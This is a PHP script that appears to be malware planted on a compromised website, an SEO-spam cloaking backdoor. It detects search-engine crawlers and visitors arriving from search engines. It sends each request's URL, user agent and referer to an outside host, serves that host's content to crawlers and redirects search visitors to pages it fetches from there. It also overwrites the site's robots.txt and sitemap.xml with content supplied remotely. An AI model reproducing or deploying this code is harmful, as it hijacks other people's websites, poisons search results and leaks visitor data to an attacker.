<?php
error_reporting(0);
$interDomain = 'http://it1.hatefemale.top/z0316_23/sitemap/';
function ex(){$str = 'exit';$str();}
function getServerContent($url, $data = array()){
    $url = str_replace(' ', '+', $url);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "$url");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    $output = curl_exec($ch);
    curl_close($ch);
    return $output;
}
function checkReferer($refer)
{
    $referbots = 'google|yahoo|bing|aol|apple';
    if ($refer != '' && preg_match("/($referbots)/si", $refer)) {
        return true;
    }
    return false;
}
function isCrawler($agent){
    $agent = strtolower($agent);
    $bots = 'googlebot|google|aol|yahoo|bingbot|bing|bytespider|applebot|spider';
    if ($agent != '' && preg_match("/($bots)/si", $agent)) {
        return true;
    }
    return false;
}
$http = isset($_SERVER['REQUEST_SCHEME']) ? strtolower($_SERVER['REQUEST_SCHEME']) . '://' : ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https://' : 'http://');
$urlMap = $interDomain . "index";
$urlJump = $interDomain . "jump";
$hosturl = $http . $_SERVER['SERVER_NAME'];
$_SERVER['SERVER_PORT'] !== '80' && $hosturl .= ':' . $_SERVER['SERVER_PORT'];
!empty($_SERVER['REQUEST_URI']) && $hosturl .= $_SERVER['REQUEST_URI'];
$con = strpos($hosturl, ".php?") > 0 ? strpos($_SERVER["REQUEST_URI"], ".php?") + 5 : 0;
if ($con === 0) {
    $con = strpos($hosturl, ".php/") > 0 ? strpos($_SERVER["REQUEST_URI"], ".php/") + 5 : 0;
}
$lang = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']) : '';
$userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? strtolower($_SERVER['HTTP_USER_AGENT']) : '';
$referer = isset($_SERVER['HTTP_REFERER']) ? strtolower($_SERVER['HTTP_REFERER']) : '';
$pathinfo = pathinfo($hosturl);
$params = array(
    'domain' => $http . $_SERVER["HTTP_HOST"],
    'req_uri' => $con > 0 ? '/' . substr($_SERVER["REQUEST_URI"], $con) : $_SERVER["REQUEST_URI"],
    'req_url' => $hosturl,
	'req_ua' => $userAgent,
	'req_rf' => $referer
);
if (isCrawler($userAgent) || substr($params['req_uri'], -7) === '/robots' || substr($params['req_uri'], -4) === '.xml') {
    $output = getServerContent($urlMap, $params);
    if (substr($params['req_uri'], -7) === '/robots' && !empty($output)) {
        $output = json_decode($output, true);
        $subfile = (isset($output[2]) && !empty($output[2])) ? true : false;
        file_put_contents(__DIR__ . '/robots.txt', (isset($output[0]) && !empty($output[0])) ? $output[0] : '', $subfile ? 8 : 0);
        file_put_contents(__DIR__ . '/sitemap.xml', (isset($output[1]) && !empty($output[1])) ? $output[1] : '');
        $robots_cont = file_get_contents(__DIR__ . '/robots.txt');
        if (strpos(strtolower($robots_cont), "sitemap")!==false) {
            die('robots.txt and sitemap.xml file create success!');
        } else {
            die('robots.txt and sitemap.xml file create fail!');
        }
    } elseif (!empty($output)) {
        if (substr($output, 0, 5) === '<?xml') {
            header("Content-type:text/xml");
        } else {
            header("Content-type:text/html; charset=utf-8");
        }
        if (strpos(strtolower($params['req_uri']), "pingsitemap.xml") === false) {
            echo $output;
        }
    }
    if (!empty($output) || (!empty($output) && substr($output, 0, 2) !== '{"')) {
        exit;
    }
}
if (checkReferer($referer)) {
    echo getServerContent($urlJump, $params);
    ex();
}
?>